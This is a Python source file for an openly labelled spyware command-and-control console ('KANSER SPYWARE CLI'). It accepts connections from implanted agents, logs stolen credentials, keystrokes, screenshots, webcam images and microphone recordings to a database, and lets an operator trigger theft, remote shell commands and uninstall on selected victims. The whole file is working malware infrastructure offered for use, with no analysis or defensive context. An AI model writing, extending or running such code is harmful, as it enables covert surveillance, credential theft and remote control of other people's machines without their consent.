#!/usr/bin/env python3
import socket, threading, json, time, os, sys, base64, sqlite3
from datetime import datetime
R, G, Y, B, W = "\033[91m", "\033[92m", "\033[93m", "\033[94m", "\033[0m"
def clear(): os.system("cls")
def ts(): return datetime.now().strftime("%H:%M:%S")
CFG = {"host":"0.0.0.0","port":5555}

def save_media(tp, dt):
    os.makedirs("screenshots", exist_ok=True)
    ext = "wav" if tp == "mic" else "jpg"
    fn = f"screenshots/{tp[:2]}_{int(time.time())}.{ext}"
    with open(fn, "wb") as f: f.write(base64.b64decode(dt))
    return fn

class SpyCli:
    def __init__(self):
        self.clients, self.selected, self.running = {}, None, True
        self.db = sqlite3.connect("spy_data.db", check_same_thread=False)
        self.db.execute("CREATE TABLE IF NOT EXISTS data (id INTEGER PRIMARY KEY AUTOINCREMENT, client TEXT, type TEXT, data TEXT, timestamp TEXT)")
        self.db.commit()
    def _srv(self):
        s = socket.socket(); s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        s.bind((CFG["host"], CFG["port"])); s.listen(50)
        print(f"{G}[{ts()}] Listening on {CFG['host']}:{CFG['port']}{W}")
        while self.running:
            try:
                s.settimeout(1); c, a = s.accept()
                threading.Thread(target=self._h, args=(c, a), daemon=True).start()
            except socket.timeout: continue
            except: break
        s.close()
    def _h(self, c, a):
        cid = f"{a[0]}:{a[1]}"; self.clients[cid] = c
        print(f"{G}[{ts()}] [+] Agent: {cid}{W}"); buf = ""
        while self.running:
            try:
                c.settimeout(1); d = c.recv(65536).decode(errors="ignore")
                if not d: break
                buf += d
                while "\n" in buf:
                    line, buf = buf.split("\n", 1); self._process(cid, line)
            except socket.timeout: continue
            except: break
        c.close()
        if cid in self.clients: del self.clients[cid]
        print(f"{R}[{ts()}] [-] Agent: {cid}{W}")
    def _process(self, cid, raw):
        try:
            msg = json.loads(raw); tp, dt = msg.get("type",""), msg.get("data","")
            self.db.execute("INSERT INTO data (client,type,data,timestamp) VALUES (?,?,?,?)", (cid, tp, str(dt)[:5000], datetime.now().isoformat())); self.db.commit()
            if tp in ("agent_hello","sysinfo"): print(f"{B}[{cid}] SYSINFO:\n{dt}{W}")
            elif tp == "credentials": print(f"{Y}[{cid}] CREDENTIALS:\n{json.dumps(json.loads(dt) if isinstance(dt,str) else dt,indent=2)}{W}")
            elif tp == "keylog": print(f"{G}[{cid}] KEYLOG: {dt}{W}")
            elif tp in ("screenshot","webcam","mic"):
                fn = save_media(tp, dt); print(f"{G}[{ts()}] [{tp.upper()}] {fn}{W}")
            elif tp == "shell": print(f"{B}[{cid}] {dt}{W}")
            elif tp == "exfil_report": print(f"{Y}[{cid}] EXFIL: {dt}{W}")
            elif tp != "heartbeat": print(f"{Y}[{cid}] [{tp}] {str(dt)[:200]}{W}")
        except: pass
    def _send(self, cid, data):
        if cid in self.clients:
            try: self.clients[cid].send((data+"\n").encode())
            except: pass
    def _sel_chk(self):
        if not self.selected: print(f"{Y}Select an agent first{W}"); return False
        return True
    def _cmd_loop(self):
        clear()
        print(f"{R}=== KANSER SPYWARE CLI v1.0 ==={W}")
        print("list | select <id> | steal | screenshot | webcam | mic | shell <cmd> | uninstall | exit\n")
        while self.running:
            try:
                raw = input(f"{G}SPY>{W} ").strip()
                if not raw: continue
                c = raw.split()
                if c[0] == "help": print("list | select <id> | steal | screenshot | webcam | mic | shell <cmd> | uninstall | exit")
                elif c[0] == "exit": self.running = False; break
                elif c[0] == "list":
                    if not self.clients: print(f"{Y}No agents{W}")
                    else:
                        for i, cid in enumerate(self.clients):
                            mk = f"{R}*{W}" if cid == self.selected else " "
                            print(f"  {mk} [{i}] {cid}")
                elif c[0] == "select" and len(c) > 1:
                    idx = int(c[1]); cids = list(self.clients.keys())
                    if 0 <= idx < len(cids):
                        self.selected = cids[idx]; print(f"{G}Selected: {self.selected}{W}")
                        self._send(self.selected, json.dumps({"cmd":"steal_now","data":""}))
                elif c[0] == "steal" and self._sel_chk():
                    self._send(self.selected, json.dumps({"cmd":"steal_now","data":""}))
                    print(f"{G}[{ts()}] Steal requested{W}")
                elif c[0] == "screenshot" and self._sel_chk():
                    self._send(self.selected, json.dumps({"cmd":"screenshot_now","data":""}))
                    print(f"{G}[{ts()}] Screenshot requested{W}")
                elif c[0] == "webcam" and self._sel_chk():
                    self._send(self.selected, json.dumps({"cmd":"webcam_now","data":""}))
                    print(f"{G}[{ts()}] Webcam requested{W}")
                elif c[0] == "mic" and self._sel_chk():
                    self._send(self.selected, json.dumps({"cmd":"mic_now","data":""}))
                    print(f"{G}[{ts()}] Mic recording requested{W}")
                elif c[0] == "shell" and self._sel_chk():
                    self._send(self.selected, json.dumps({"cmd":"shell","data":raw[6:]}))
                elif c[0] == "uninstall" and self._sel_chk():
                    self._send(self.selected, json.dumps({"cmd":"uninstall","data":""}))
                    print(f"{G}[{ts()}] Uninstall sent{W}")
                else: print(f"{R}Unknown: {c[0]}{W}")
            except KeyboardInterrupt: self.running = False; break
            except: print(f"{R}Error{W}")
    def run(self):
        os.makedirs("screenshots", exist_ok=True)
        threading.Thread(target=self._srv, daemon=True).start()
        self._cmd_loop(); print(f"{Y}[{ts()}] Stopped{W}")

if __name__ == "__main__":
    try: SpyCli().run()
    except KeyboardInterrupt: pass
